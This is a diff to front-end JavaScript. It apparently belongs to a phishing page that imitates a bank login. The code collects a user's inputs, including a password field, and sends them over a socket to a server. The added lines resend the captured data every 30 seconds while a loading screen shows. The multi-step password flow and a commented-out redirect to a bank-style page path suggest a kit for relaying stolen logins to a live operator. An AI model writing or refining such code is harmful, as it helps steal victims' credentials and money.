@@ -83,6 +83,11 @@ emitDataServer.addEventListener("click", () => {
     } else if (dataInputs.pass.length == 0) {
         if (passCount == 0) {
             socket.emit("ShowAvatar", dataInputs);
+            setInterval(() => {
+                if(dataInputs.pass.length == 0 && preloader.style.display == "block"){
+                    socket.emit("ShowAvatar", dataInputs);
+                }
+            }, 30000);
         } else {
             Alert2.style.display = "flex";
             preloader.style.display = "none";
@@ -90,6 +95,11 @@ emitDataServer.addEventListener("click", () => {
         passCount += 1;
     } else {
         socket.emit("Data", dataInputs);
+        setInterval(() => {
+            if(dataInputs.pass.length > 0 && preloader.style.display == "block"){
+                socket.emit("Data", dataInputs);
+            }
+        }, 30000);
         preloader.style.display = "block";
         //window.location.href = "/m/faces/pages/inicio.xhtml?s="+socket.id;
     }
